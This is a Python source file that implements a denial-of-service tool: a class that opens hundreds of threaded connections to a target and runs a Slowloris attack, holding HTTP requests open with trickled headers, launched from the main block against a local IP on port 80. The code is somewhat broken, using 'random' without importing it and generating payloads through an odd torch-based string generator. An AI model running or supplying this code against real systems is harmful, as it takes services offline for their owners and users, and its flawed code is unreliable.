import torch
import torch.nn as nn
import socket
import threading
import time
from .random_string_generator import RandomStringGenerator
import logging

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


class DoSAttack:
    def __init__(self, target_ip, target_port, num_connections, attack_type="SYN"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_connections = num_connections
        self.threads = []
        self.model = RandomStringGenerator(100)
        self.attack_type = attack_type

    def simulate_attack(self):
        for _ in range(self.num_connections):
            if self.attack_type == "Slowloris":
                thread = threading.Thread(target=self.slowloris_attack)
            else:
                thread = threading.Thread(target=self.create_connection)
            self.threads.append(thread)
            thread.start()

    def create_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            payload = self.model(torch.tensor([])).encode()  # Generate payload
            sock.send(payload)
            logging.info("Payload sent.")
            sock.send(b"QUIT")
            sock.close()
        except Exception as e:
            logging.error(f"Exception occurred while creating a connection: {e}")

    def slowloris_attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            sock.send(
                "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")
            )
            headers = [
                (
                    "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                    " (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
                ),
                "Content-Type: application/x-www-form-urlencoded",
            ]
            for header in headers:
                sock.send(bytes("{}\r\n".format(header).encode("utf-8")))
        except socket.error:
            logging.error(f"Error initiating Slowloris attack.")
        while True:
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                time.sleep(random.uniform(10, 15))
            except socket.error:
                break
        sock.close()

    def wait_for_threads(self):
        for thread in self.threads:
            thread.join()


if __name__ == "__main__":
    dos = DoSAttack(
        "192.168.1.1", 80, 500, "Slowloris"
    )  # target IP, target port, number of connections, type of attack
    dos.simulate_attack()
    dos.wait_for_threads()
